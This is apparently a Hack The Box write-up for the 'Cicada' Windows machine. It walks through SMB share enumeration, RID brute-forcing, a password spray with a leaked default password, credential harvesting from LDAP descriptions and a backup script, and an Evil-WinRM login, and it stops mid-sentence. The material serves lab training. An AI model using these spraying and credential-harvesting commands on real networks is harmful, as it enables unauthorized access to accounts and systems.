--- 
title: "Hack the Box (HTB) - Cicada"
description: "Path Traversal & Arbitrary code execution"
date: 2025-10-26 12:00:00 -100
image: /assets/images/HTB - Cicada/Cicada TN.jpg
categories: [CTF]
tags: [windows,smb,]    # TAG names should always be lowercase
---

## Enumeration

We'll start by running an ***nmap*** scan against our target at `10.10.11.35`

```bash
nmap -sC -sV -A -p- 10.10.11.35 -oN nmap.txt
```

We see the following ports & services

| Port   | State | Service        | Server / Version                                         |
|--------|-------|----------------|---------------------------------------------------------|
| 53     | open  | domain         | Simple DNS Plus                                         |
| 88     | open  | kerberos-sec   | Microsoft Windows Kerberos (server time: 2024-11-21)   |
| 135    | open  | msrpc          | Microsoft Windows RPC                                   |
| 139    | open  | netbios-ssn    | Microsoft Windows netbios-ssn                          |
| 389    | open  | ldap           | Microsoft Windows Active Directory LDAP                |
| 445    | open  | microsoft-ds   | Microsoft Windows SMB                                  |
| 464    | open  | kpasswd5       | Unknown (Kerberos Password Change)                     |
| 593    | open  | ncacn_http     | Microsoft Windows RPC over HTTP 1.0                   |
| 636    | open  | ssl/ldap       | Microsoft Windows Active Directory LDAP over SSL       |
| 3268   | open  | ldap           | Microsoft Windows Active Directory Global Catalog      |
| 3269   | open  | ssl/ldap       | Microsoft Windows Active Directory Global Catalog over SSL |
| 5985   | open  | http           | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                |
| 60977  | open  | msrpc          | Microsoft Windows RPC                                  |

Let's start with enumeration on SMB

```bash
netexec smb cicada.htb -u Jigsaw64 -p "" --shares
```

![Initial SMB](/assets/images/HTB%20-%20Cicada/Initial%20SMB.png)

It looks like we have anonymous access to the `HR` & `IPC$` shares. Since IPC$ is a system default administrative share let's check the non-standard HR share

![HR Share](/assets/images/HTB%20-%20Cicada/HR%20Share.png)

We see a text file labeled **Notice form HR.txt**. Let's grab this file

![HR file](/assets/images/HTB%20-%20Cicada/HR%20File.png)

We were successfully able to grab the HR note. Let's proceed to examine the contents of this file

![New hire PW](/assets/images/HTB%20-%20Cicada/New%20hire%20pw.png)

It appears to be ***domain access credentials*** for a new hire. It includes a default password of `Cicada$M6Corpb*@Lp#nZp!8` and instructions for changing it upon logging into their Cicada Corp account

We have a password, but we don't know if any users on this domain. Let's use the tool `netexec` to enumerate the domain cicada.htb. First, let's add the domain to our /etc/hosts file

```bash
echo "10.10.11.35 cicada.htb CICADA-DC.cicada.htb" | sudo tee -a /etc/hosts
```

This command maps the domain `cicada.htb` and hostname `CICADA-DC.cicada.htb` to the IP `10.10.11.35`

Now, let's run netexec to enumerate our users

```bash
netexec smb cicada.htb -u username -p "" --rid-brute
```

![Users](/assets/images/HTB%20-%20Cicada/Users.png)

We have our users. This likely worked due to the server being misconfigured to allow anonymous SID enumeration via SMB, likely due to poor GP or domain security settings

The users are as follows:

| RID   | Username           |
|-------|---------------------|
| 500   | Administrator       |
| 501   | Guest               |
| 502   | krbtgt              |
| 1000  | CICADA-DC$          |
| 1104  | john.smoulder       |
| 1105  | sarah.dantelia      |
| 1106  | michael.wrightson   |
| 1108  | david.orelious      |
| 1601  | emily.oscars        |

Now let's put the users into a file

![user file](/assets/images/HTB%20-%20Cicada/Users%20file.png)

Great, now we can begin the password spray attack

```bash
netexec smb cicada.htb -u users.txtr -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

![Users confirmed](/assets/images/HTB%20-%20Cicada/Users%20confirmed.png)

It looks like the password for `michael.wrightson` is valid. The guest fallback for administrator is irrelevant

With a valid user, we can probably query LDAPas it often requires valid credentials

We can run the following command to connect to the LDAP server on cicada.htb to extract domain information

```bash
ldapsearch -H ldap://cicada.htb -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b 'dc=cicada,dc=htb' | grep -i -B 5 -A 5 "pass"
```

![David Pass](/assets/images/HTB%20-%20Cicada/David%20Pass.png)

Oops, it looks like `David Orelious` opted to put his password `aRt$Lp#7t*VQ!3` in his account description

Let's now enumerate the SMB shares as `david.orelious`

```bash
netexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```

![Dev Read access](/assets/images/HTB%20-%20Cicada/Dev%20Read%20access.png)

We have read access to the `DEV` share. Let's connect and see what's inside

```bash
smbclient -U "david.orelious" //10.10.11.35/DEV
```

![Inside DEV](/assets/images/HTB%20-%20Cicada/Inside%20DEV.png)

We see this powershell script `Backup_script.ps1`. Let's grab this script and take a look at it

```bash
get "Backup_script.ps1"
```

![ps1 script](/assets/images/HTB%20-%20Cicada/ps1%20script.png)

The script looks like it's designed to backup the C:\smb directory, compress it into a zip and save it into D:\Backup. There's a mention of username `emily.oscars` and password `Q!3@Lp#M6b*7t*Vt` but they don't actually get  used in the script

Let's use to see what shares emily has access to

![Emily SMB enum](/assets/images/HTB%20-%20Cicada/Emily%20SMB%20enum.png)

With this user, we have read/write access to `C$` (the entire C: drive)

![User Flag](/assets/images/HTB%20-%20Cicada/User%20flag.png)

There's the `user flag`

We need an actual shell though. Earlier we numerated port `5986` which is commonly used for ***Windows Remote Management (WinRM) over HTTPS*** WinRM is a protocol that lets admins manage windows systems remotely. By default, WinRM is limited to members of the admin group / members of the remote management group

Obviously since `emily.oscars` has more privileges on the SMB shares, she might also have the necessary rights to use WinRM

Here, we can use a tool called [Evil-WinRM](https://www.kali.org/tools/evil-winrm/) to interact wit the WinRM service as it's much easier and 

```bash
evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

